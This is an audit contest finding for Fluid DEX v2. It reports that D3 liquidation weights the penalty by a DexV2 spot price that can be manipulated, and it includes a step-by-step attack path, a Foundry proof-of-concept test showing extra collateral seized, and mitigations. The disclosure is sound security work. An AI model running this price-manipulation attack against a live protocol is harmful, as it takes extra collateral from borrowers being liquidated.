# D3 liquidation uses the manipulable DexV2 spot price to weight the liquidation penalty

**Fluid DEX v2**, Sherlock, January 2026, judged **Medium**, contest rank 7th  
Contest page: https://audits.sherlock.xyz/contests/1225  
Audited commit: `bd466082e02cb70b2746e882e544ba99cb328fc5` (https://github.com/sherlock-audit/2026-01-fluid-dex-v2)

This is the submission I sent in. Links into the private contest fork are replaced by file references.

---
## Summary

When liquidating a D3 collateral position, the Money Market computes an **average liquidation penalty** by weighting token0/token1 penalties by the position’s **current token composition/value**. That composition is derived using `_getD3SupplyAmounts(... sqrtPriceX96: AT_POOL_PRICE)`, which resolves to the **current DexV2 pool spot `currentSqrtPrice`**.

Because DexV2 swaps are permissionless, a liquidator can **swap to move the pool spot price** immediately before liquidation, shifting the computed weights toward the higher-penalty token and **increasing seized collateral** for the same payback amount (bounded by configured caps).

## Root Cause

In the D3 liquidation withdraw path, the contract:
1) fetches D3 amounts using **spot price** (`AT_POOL_PRICE`), then  
2) uses those spot-dependent amounts to compute a value-weighted penalty.

From `fluid-contracts/contracts/protocols/moneyMarket/core/liquidateModule/main.sol:365-379`

```solidity
(
    vl_.token0SupplyAmount,
    vl_.token1SupplyAmount,
    feeAccruedToken0_,
    feeAccruedToken1_
) = _getD3SupplyAmounts(
    _getDexId(dexKey_),
    GetD3D4AmountsParams({
        tickLower: s_.tickLower,
        tickUpper: s_.tickUpper,
        positionSalt: s_.positionSalt,
        token0Decimals: vl_.token0Decimals,
        token1Decimals: vl_.token1Decimals,
        token0ExchangePrice: token0SupplyExchangePrice_,
        token1ExchangePrice: token1SupplyExchangePrice_,
        sqrtPriceX96: AT_POOL_PRICE
    })
);

// ...prices from oracle...
uint256 supplyValue0_ = (((vl_.token0SupplyAmount * vl_.token0Price) + 1) / 1e18) + 1;
uint256 supplyValue1_ = (((vl_.token1SupplyAmount * vl_.token1Price) + 1) / 1e18) + 1;

averageLiquidationPenalty_ =
    ((vl_.token0LiquidationPenalty * supplyValue0_) +
     (vl_.token1LiquidationPenalty * supplyValue1_)) / (supplyValue0_ + supplyValue1_);

v_.withdrawValue = ((v_.withdrawValue * (1000 + averageLiquidationPenalty_)) - 1) / 1000;
```

`AT_POOL_PRICE` resolves to DexV2’s stored spot `currentSqrtPrice` in helpers.sol:

```solidity
if (params_.sqrtPriceX96 == AT_POOL_PRICE) {
    params_.sqrtPriceX96 = (dexVariables_ >> DSL.BITS_DEX_V2_VARIABLES_CURRENT_SQRT_PRICE) & X72;
    params_.sqrtPriceX96 = BM.fromBigNumber(params_.sqrtPriceX96, DEFAULT_EXPONENT_SIZE, DEFAULT_EXPONENT_MASK);
}
(token0SupplyAmount_, token1SupplyAmount_) = LA.getAmountsForLiquidity(uint160(params_.sqrtPriceX96), ...);
```

DexV2 spot price is permissionlessly movable via swaps (started through `startOperation()` in main.sol) and executed via the D3 swap module `fluid-contracts/contracts/protocols/dexV2/dexTypes/d3/core/swapModule.sol:10`.

## Internal Pre-conditions

- A liquidatable NFT has a **D3 collateral position**.
- The D3 tokens have **different liquidation penalties** (or are capped differently by `maxLiquidationPenalty`), so the weighted average can change.

## External Pre-conditions

- The liquidator can perform DexV2 swaps for the pool (permissionless).
- There is sufficient pool liquidity to move the spot price enough to measurably change the D3 token composition/value split (even within a bounded range).

## Attack Path

1. Identify a liquidatable NFT with a D3 collateral position.
2. Perform one or more DexV2 swaps to move the pool’s **spot** `currentSqrtPrice` in a direction that increases the D3 position’s inferred value-weight toward the **higher-penalty** token.
3. Call `MoneyMarket.liquidate()` with the same payback amount.
4. Because `averageLiquidationPenalty_` is computed from spot-dependent `token0SupplyAmount/token1SupplyAmount`, the penalty increases and the liquidator **seizes more collateral** than they would have at the unmanipulated spot price.

## Impact

**additional user loss during liquidation (MEV/economic manipulation).**

- A liquidator can systematically increase seized collateral for a given payback by manipulating DexV2 spot price right before liquidation.
- The gain is **bounded** by configured liquidation penalties and `maxLiquidationPenalty` (computed during liquidation), but can still be materially large per liquidation.

Measured in the PoC (same pre-state, same payback):
- seized value without spot manipulation ≈ **$3,738**
- seized value after manipulation ≈ **$3,976**
- delta ≈ **$238** extra collateral seized

## PoC

Add the following to test/foundry/moneyMarket

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import { MoneyMarketTest } from "./main.sol";
import { LiquidateParams } from "../../../contracts/protocols/moneyMarket/core/other/structs.sol";
import { SwapInParams, DexKey } from "../../../contracts/protocols/dexV2/dexTypes/common/d3d4common/structs.sol";

/// @notice Demonstrate that D3 liquidation output depends on the
///         *current DEX pool price* (via `AT_POOL_PRICE`), which a liquidator can move via swaps
///         immediately before calling `moneyMarket.liquidate()`.
contract D3LiquidationPenaltyManipulationPoC is MoneyMarketTest {
    function test_poc_d3LiquidationSeizeChangesWithSpotPrice() public {
        // 1) Create and cap a D3 USDC/ETH pool, and list tokens in MM.
        D3D4TestVars memory vars = _setupD3Pool();

        // 2) Make liquidation penalties asymmetric so the value-weighted average can move.
        //    Keep within AdminModule constraint: LT*(1+LP) <= 99%.
        //    LT is 85% (850). So LP up to 164 is allowed.
        _setLiquidationPenalty(0, NATIVE_TOKEN_ADDRESS, 0); // ETH LP = 0%
        _setLiquidationPenalty(0, address(USDC), 160); // USDC LP = 16%

        // 3) List USDT as a debt-only token.
        _listUSDTAsDebtOnly();

        // 4) Create a D3 collateral position: ~4000 USDC + 1 ETH.
        (uint256 nftId, ) = _depositD3Position(vars.dexKey, vars.positionTickLower, vars.positionTickUpper, 4000 * 1e6, 1 ether);

        // 5) Borrow 1000 USDT at $1, then make it liquidatable by raising USDT price to $7.
        //    Collateral value ~= $8000, LT=85% => normalized ~= $6800.
        //    Debt value after change ~= $7000 => HF < 1, but collateralValue > debtValue, so max LP > 0.
        uint256 usdtTokenIndex = 3; // ETH=1, USDC=2, USDT=3 in this suite ordering

        // Borrow position index should become 2 (after D3 at index 1), but we don't rely on that.
        (, uint256 borrowPositionIndex) = moneyMarket.operate(
            nftId,
            0,
            abi.encode(uint256(2), usdtTokenIndex, uint256(1000 * 1e6), address(this))
        );
        assertTrue(borrowPositionIndex != 0, "expected borrow position index");

        oracle.setPrice(address(USDT), 7e18);

        // Sanity: liquidation should now be possible.
        // We'll use the same payback amount in both scenarios.
        uint256 paybackAmount = 500 * 1e6; // 500 USDT

        uint256 snapshotId = vm.snapshot();

        // Scenario A: liquidate without manipulating pool price.
        uint256 seizedValueA = _liquidateAndMeasureSeizedUsdValue(nftId, borrowPositionIndex, paybackAmount);

        bool ok = vm.revertTo(snapshotId);
        assertTrue(ok, "revertTo(snapshot) failed");

        // Scenario B: liquidator moves pool price down (ETH -> USDC swaps), then liquidates.
        // Goal: push the D3 position's composition toward USDC so avg liquidation penalty increases.
        // Use smaller swaps in a loop to stay within the DEX's per-swap price-movement constraints.
        for (uint256 i = 0; i < 2000; i++) {
            // Swap USDC -> ETH in small increments (USDC has 6 decimals).
            if (!_trySwapInPool(vars.dexKey, 100 * 1e6, true)) {
                break;
            }
        }

        uint256 seizedValueB = _liquidateAndMeasureSeizedUsdValue(nftId, borrowPositionIndex, paybackAmount);

        emit log_named_uint("seizedValueA (USD e18)", seizedValueA);
        emit log_named_uint("seizedValueB (USD e18)", seizedValueB);
        emit log_named_uint("delta (USD e18)", seizedValueB - seizedValueA);

        // The manipulated scenario should seize *more USD value* from the same position for the same debt payback.
        assertGt(seizedValueB, seizedValueA, "expected higher seizure after spot manipulation");

        // Require a non-trivial delta to avoid false positives from rounding noise.
        // (We expect ~7% higher in this setup, which is >> $1.)
        assertGt(seizedValueB - seizedValueA, 10e18, "delta too small; manipulation not observable");
    }

    function _listUSDTAsDebtOnly() internal {
        oracle.setPrice(address(USDT), 1e18);

        // collateralClass=0 (disabled), debtClass=1 (permissioned)
        (bool ok,) = address(moneyMarket).call(
            abi.encodeWithSelector(
                moneyMarketAdminModule.listToken.selector,
                address(USDT),
                0,
                1,
                800,
                850,
                50
            )
        );
        require(ok, "Failed to list USDT");

        (ok,) = address(moneyMarket).call(
            abi.encodeWithSelector(
                moneyMarketAdminModule.updateTokenDebtCap.selector,
                address(USDT),
                1_000_000 * 1e6
            )
        );
        require(ok, "Failed to set USDT debt cap");
    }

    function _setLiquidationPenalty(uint256 emode_, address token_, uint256 newPenalty_) internal {
        (bool ok,) = address(moneyMarket).call(
            abi.encodeWithSelector(
                moneyMarketAdminModule.updateLiquidationPenalty.selector,
                emode_,
                token_,
                newPenalty_
            )
        );
        require(ok, "Failed to update liquidation penalty");
    }

    function _trySwapInPool(DexKey memory dexKey_, uint256 amountIn, bool swap0To1) internal returns (bool) {
        if (swap0To1) {
            deal(address(USDC), address(this), USDC.balanceOf(address(this)) + amountIn);
            USDC.approve(address(dexV2), type(uint256).max);
        } else {
            deal(address(this), address(this).balance + amountIn);
        }

        SwapInParams memory swapParams_ = SwapInParams({
            dexKey: dexKey_,
            swap0To1: swap0To1,
            amountIn: amountIn,
            amountOutMin: 0,
            controllerData: hex""
        });

        bytes memory callbackData_ = abi.encodeWithSelector(
            this.shouldSwapInCallbackImplementation.selector,
            swapParams_
        );

        try dexV2.startOperation(callbackData_) returns (bytes memory) {
            return true;
        } catch {
            return false;
        }
    }

    function _liquidateAndMeasureSeizedUsdValue(
        uint256 nftId,
        uint256 paybackPositionIndex,
        uint256 paybackAmount
    ) internal returns (uint256 seizedUsdValueE18_) {
        // Liquidator is bob.
        deal(address(USDT), bob, 10_000_000 * 1e6);

        uint256 bobUsdcBefore = USDC.balanceOf(bob);
        uint256 bobUsdtBefore = USDT.balanceOf(bob);
        uint256 bobEthBefore = bob.balance;

        vm.startPrank(bob);
        USDT.approve(address(moneyMarket), type(uint256).max);

        (, bytes memory withdrawData) = moneyMarket.liquidate(
            LiquidateParams({
                nftId: nftId,
                paybackPositionIndex: paybackPositionIndex,
                withdrawPositionIndex: 1, // D3 position created first
                to: bob,
                estimate: false,
                paybackData: abi.encode(uint256(paybackAmount))
            })
        );
        vm.stopPrank();

        // Decode D3 withdraw amounts (token0=USDC, token1=ETH in this pool).
        (uint256 usdcOut, uint256 ethOut) = abi.decode(withdrawData, (uint256, uint256));
        assertTrue(usdcOut > 0 || ethOut > 0, "expected some collateral withdrawn");

        // Use actual balance deltas to value what bob received.
        uint256 usdcDelta = USDC.balanceOf(bob) - bobUsdcBefore;
        uint256 ethDelta = bob.balance - bobEthBefore;
        uint256 usdtDeltaPaid = bobUsdtBefore - USDT.balanceOf(bob);

        // Sanity: ensure liquidator really paid what we asked.
        assertEq(usdtDeltaPaid, paybackAmount, "unexpected USDT payback delta");

        // Value deltas using oracle prices (stored as 18 decimals per 1 whole token).
        uint256 usdcValueE18 = (usdcDelta * oracle.tokenPrices(address(USDC))) / 1e6;
        uint256 ethValueE18 = (ethDelta * oracle.tokenPrices(NATIVE_TOKEN_ADDRESS)) / 1e18;

        // Return gross seized collateral value (ignore the paid debt value; we only compare seizure size).
        seizedUsdValueE18_ = usdcValueE18 + ethValueE18;

        // Extra sanity: decoded withdrawData should match balance deltas (allow minor rounding differences).
        // (The liquidation path may also include fee components, so balance deltas are the ground truth.)
        assertApproxEqAbs(usdcOut, usdcDelta, 5, "USDC out mismatch");
        assertApproxEqAbs(ethOut, ethDelta, 5, "ETH out mismatch");
    }
}
```

## Mitigation

Use a composition/weighting input that is not liquidator-controllable at liquidation time, for example:

- **Decouple penalty-weighting from pool spot price:** compute the D3 amounts for weighting using an oracle-implied `sqrtPriceX96` (similar to how `_getHfInfo()` derives a price from oracle prices) instead of `AT_POOL_PRICE`, while still executing the actual withdraw at the real pool price.
- **Conservative weighting rule:** ensure the penalty used cannot be increased by shifting composition (e.g., use `min(token0LP, token1LP)` or another non-increasing function with respect to composition changes).
